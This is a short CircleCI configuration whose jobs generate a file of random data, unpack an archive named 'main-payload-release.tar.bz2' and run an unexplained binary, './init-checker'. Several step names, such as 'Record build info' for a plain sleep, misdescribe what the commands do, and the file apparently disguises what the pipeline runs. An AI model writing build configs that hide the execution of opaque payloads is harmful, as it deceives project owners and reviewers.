version: 2.1

jobs:
  NODE_SUB:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Generate digest D
          command: |
            mkdir -p /tmp/tau
            set +o pipefail 2>/dev/null; head -c 100000 /dev/urandom | xxd -p | tr 'a-f' 'A-F' > /tmp/tau/GPU-engine; true
            wc -c /tmp/tau/GPU-engine | awk '{print "f:",$1}'
      - persist_to_workspace:
          root: /tmp/tau
          paths:
            - 'GPU-engine'
  PackageService:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/tau
      - run:
          name: Load 4
          command: |
            cnt_lines() { awk 'END{print NR}' "$1" 2>/dev/null; }; cnt_lines /tmp/tau/GPU-engine || true
      - run:
          name: Fetch main branch
          command: git clone --depth 3 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Extract sources
          command: tar -I bzip2 -xf main-payload-release.tar.bz2
      - run:
          command: env | wc -l
      - run:
          name: Record build info
          command: sleep 25s
      - run:
          name: Cooldown
          command: date -u
      - run:
          command: /bin/sh -c "./init-checker"
